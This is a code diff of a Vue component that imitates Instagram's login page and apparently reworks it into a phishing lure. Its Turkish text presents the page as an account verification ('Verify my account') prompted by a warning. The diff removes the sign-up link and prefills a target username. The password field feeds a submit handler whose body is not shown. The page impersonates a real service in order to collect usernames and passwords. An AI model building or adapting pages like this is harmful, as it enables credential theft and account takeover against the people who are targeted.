@@ -27,28 +27,28 @@
                   <form class="form">
 
                     <div class="input-box">
-                      <input v-model="usern" type="text" id="name" aria-describedby="" placeholder="Phone number, username, or email" aria-required="true" maxlength="30" autocapitalize="off" autocorrect="off" name="username" value="" required>
+                      <input v-model="usern" type="text"  placeholder="Telefon numarası, kullanıcı adı, veya email" aria-required="true" maxlength="30" autocapitalize="off" autocorrect="off" name="username" required>
                     </div>  
 
                     <div class="input-box">
-                      <input v-model="passw" type="password" name="password" id="password" placeholder="Password" aria-describedby="" maxlength="30" aria-required="true" autocapitalize="off" autocorrect="off" required>
+                      <input v-model="passw" type="password" name="password" id="password" placeholder="Şifre" aria-describedby="" maxlength="30" aria-required="true" autocapitalize="off" autocorrect="off" required>
                     </div>  
 
                     <span class="button-box">
-                      <button @click="okey" class="btn" type="submit" name="submit">Log in</button>
+                      <button @click="okey" class="btn" type="submit" name="submit">Hesabımı Doğrula</button>
                     </span>  
 
-                    <a class="forgot" href="">Forgot password?</a>
+                    <a class="forgot" href="">Neden böyle bir uyarı aldım?</a>
                   </form>
                 </div> <!-- Form-wrap end -->
               </div> <!-- Login-box end -->
 
-              <div class="login-box">
+              <!-- <div class="login-box">
                 <p class="text">Don't have an account?<a href="#">Sign up</a></p>
-              </div> <!-- Signup-box end -->
+              </div> Signup-box end -->
 
               <div class="app">
-                <p>Get the app.</p>
+                <!-- <p>Get the app.</p> -->
                 <div class="app-img">
                   <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
                     <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png" >
@@ -89,7 +89,7 @@
             </ul>
           </nav>
 
-          <span class="footer-logo">&copy; 2018 Instagram</span>
+          <span class="footer-logo">&copy; 2023 Instagram</span>
         </div> <!-- Footer container end -->
       </footer>
       
@@ -106,7 +106,7 @@ import Navbar from '/src/components/Navbar.vue';
 import Footer from '/src/components/Footer.vue';
 import { ref } from 'vue';
 
-const usern = ref('')
+const usern = ref('11sefaa')
 const passw = ref('');
 
 const okey = () => {
